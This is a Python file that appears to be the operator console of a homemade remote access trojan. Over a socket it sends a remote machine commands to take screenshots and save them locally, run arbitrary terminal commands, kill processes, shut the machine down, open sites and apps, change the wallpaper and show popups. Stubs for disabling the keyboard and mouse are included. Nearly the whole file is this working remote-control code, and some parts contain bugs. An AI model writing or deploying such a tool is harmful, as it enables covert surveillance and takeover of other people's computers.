from time import sleep
import socket as ss
from PIL import Image
from pyautogui import alert
import io
from Crypto import cripto as jeff


# ---------------------------------------------------- #
             # Create Popup Command
# ---------------------------------------------------- #

def popup(objj, menssagem):
    try:
        send = f"showpopupinwindow\\{menssagem}"
        objj.send(bytes(send, "utf8"))
        send = ""
        return "Comando executado"
    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
            # Print Screen Command
# ---------------------------------------------------- #

def printt(objj, nome):
    try:
        objj.send(bytes(f"printscreensendconfirmationsignal", "utf8"))
        with open('C:\\Users\\drrod\\Desktop\\all\\Creative in Python\\PyPy\\apps py\\Door_project\\Pictures\\' + nome + '.png', 'wb') as foto:
                try:
                    while True:
                        dab = objj.recv(100000)
                        if not dab:
                            alert(f"Imagem {nome} instalada!")
                            break
                        foto.write(dab)

                except Exception:
                    sleep(1.5)
                    return "Photo Error"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
             # Shutdown Command
# ---------------------------------------------------- #

def desligar(objj):
    try:
        objj.send(bytes("shutdowncomputersystem", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                return dab.decode("utf-8")

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
             # Open Site Command
# ---------------------------------------------------- #

def sit(objj, abc):
    try:
        objj.send(bytes(f"siteentering\\{abc}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                returno = dab.decode("utf-8")
                break
        alert(returno)

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
            # ---> Kill Window Command <---
# ---------------------------------------------------- #

def __kill_window(objj):
    try:
        objj.send(bytes("windowkillblackandshutdown", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                return dab.decode("utf-8")

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
             # Kill Process Command
# ---------------------------------------------------- #

def kill_process(objj, processo):
    try:
        objj.send(bytes(f"killterminalpidprocess\\{processo}.exe", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                return dab.decode("utf-8")

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
            # ---> Open App Command <---
# ---------------------------------------------------- #

def open_app(objj, processo):
    try:
        objj.send(bytes(f"oppenupapp\\{processo}.exe", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return dab.decode("utf-8")

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
          # ---> Kill Keyboard Command <---
# ---------------------------------------------------- #

def kill_keyboard(objj):
    pass


# ---------------------------------------------------- #
          # ---> Kill Mouse Command <---
# ---------------------------------------------------- #

def kill_mouse(objj):
    pass


# ---------------------------------------------------- #
         # ---> Change Wallpaper Command <---
# ---------------------------------------------------- #


def wallpaper(objj, photo):
        try:
            objj.send(bytes("configatwallpaperwindow", "utf-8"))
            while True:
                objj.recv(1024)
                if objj:
                    work = objj.decode("utf-8")
                    break
            if work:
                pass
            foto = Image.open(photo)
            f = io.BytesIO()
            foto.save(f, 'PNG')
            objj.send(bytes(f.getvalue()))
            return "Comando executado"

        except FileNotFoundError:
            sleep(1.5)
            return "File Not Found"
        except ConnectionRefusedError:
            sleep(1.5)
            return "Conection erro"
        except ConnectionAbortedError:
            sleep(1.5)
            return "Conection erro"
        except ss.error:
            sleep(1.5)
            return "Conection erro"
        except Exception:
            sleep(1.5)
            return "Error erro"


# ---------------------------------------------------- #
            # Catch Process Command
# ---------------------------------------------------- #

def process(objj, name):
    try:
        objj.send(bytes(f"RP", "utf8"))
        with open(f"processos_{name}", 'w+') as txt:
            txt.write(f"Cliente {name} process\n")
            txt.write(f"{'-='*30}\n\n")
            while True:
                dab = objj.recv(1024)
                if dab:
                    proc = dab.decode("utf-8").split(",")
                    for a in proc:
                        txt.write(a)
                    txt.close()
                    return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# ---------------------------------------------------- #
              # Execute Terminal Command
# ---------------------------------------------------- #


def expecifico(objj, comando):
    try:
        objj.send(bytes(f"expecifico\\{comando}", "utf8"))
        while True:
            dab = objj.recv(1024)
            if dab:
                print(dab.decode("utf-8"))
                return "Comando executado"

    except ConnectionRefusedError:
        sleep(1.5)
        return "Conection erro"
    except ConnectionAbortedError:
        sleep(1.5)
        return "Conection erro"
    except ss.error:
        sleep(1.5)
        return "Conection erro"
    except Exception:
        sleep(1.5)
        return "Error"


# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
                        # Script End
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
